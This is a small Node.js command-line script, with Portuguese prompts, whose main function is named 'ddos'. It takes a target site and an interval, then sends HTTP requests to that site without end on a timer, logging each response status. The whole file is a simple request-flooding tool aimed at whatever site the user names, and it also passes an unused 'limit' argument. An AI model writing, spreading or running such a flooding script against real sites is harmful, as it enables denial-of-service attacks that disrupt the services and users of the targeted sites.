#!/usr/bin/env node

var program = require('commander');
var http = require('request');
program
.version('0.1.0')
.option('-s, site <s>', 'Entre com o nome do site para enviar requests', String)
.option('-t, time <n>', 'Entre com o intervalo em milisegundos para as requests 1000', parseInt)
.parse(process.argv);


function ddos(s, t){
  console.log('Iniciando...');
  if(s){
      setInterval(function(){
        http(s, function(err, res){
          if(err)
            process.exit(1);

          if (res.statusCode == 200) {
            console.log('acessando: '+ s);
          }else{
            console.log('Não acessou: '+res.statusCode);
          }
        });
      }, t);
  }else{
    console.log('Você precisa indicar um site!');
    process.exit();
  }
}

ddos(program.site, program.time || 1000, program.limit);
